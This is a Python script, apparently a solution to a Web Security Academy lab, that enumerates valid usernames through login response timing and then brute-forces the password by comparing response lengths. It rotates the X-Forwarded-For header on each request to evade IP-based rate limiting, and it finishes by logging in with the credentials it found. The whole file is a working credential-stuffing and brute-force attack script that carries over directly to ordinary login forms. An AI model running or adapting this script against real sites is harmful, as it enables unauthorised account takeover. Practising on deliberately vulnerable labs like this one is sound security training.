import requests
import sys

URL_LOGIN = 'https://0abd009c0481dfd183ba4bcb00b2004e.web-security-academy.net/login'

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

payload = {
    'username': '',
    'password': '',
}

usernames = open('./../common_username.txt', 'r', encoding='utf-8').read().strip().split('\n')
passwords = open('./../common_password.txt', 'r', encoding='utf-8').read().strip().split('\n')

session = requests.Session()


# Check validate username
with open('validate_username.txt', 'w', encoding='utf-8') as f:
    res = {}

    f.write('username,response_time,status_code\n')
    for idx, username in enumerate(usernames):
        headers = {'X-Forwarded-For': f'{idx + 200}'}
        payload['username'] = username
        payload['password'] = 'a' * 200
        req = session.post(URL_LOGIN, data=payload, headers=headers)
        
        response_time = req.elapsed.total_seconds() * 1000
        res[username] = response_time

        f.write(f"{username},{response_time},{req.status_code}\n")
        print(username, response_time)

    valid_username = ''
    mx_response_time = 0
    for username, response_time in res.items():
        if response_time > mx_response_time:
            mx_response_time = response_time
            valid_username = username

print(f'valid username is {valid_username}')

# Check validate password for username found above
with open('validate_password.txt', 'w', encoding='utf-8') as f:
    res = {}
    count = {}

    f.write('password,length,status_code\n')
    for idx, password in enumerate(passwords):
        headers = {'X-Forwarded-For': f'{idx + 200}'}
        payload['username'] = valid_username
        payload['password'] = password
        req = session.post(URL_LOGIN, data=payload, headers=headers)
        
        length = len(req.content)
        count[length] = count.get(length, 0) + 1
        res[password] = length

        f.write(f"{password},{len(req.content)},{req.status_code}\n")
        print(password, len(req.content))

    valid_password = ''
    for password, length in res.items():
        if count[length] == 1:
            valid_password = password
            break

print("Valid credentials:")
print(f'username: {valid_username}, password: {valid_password}')


headers = {'X-Forwarded-For': '10000'}
payload['username'] = valid_username
payload['password'] = valid_password
req = session.post(URL_LOGIN, data=payload, headers=headers)
if req.status_code == 200 and 'Log out' in req.text:
    print('[+] Successfully login to valid account')
else:
    print('[-] Fail to get credential')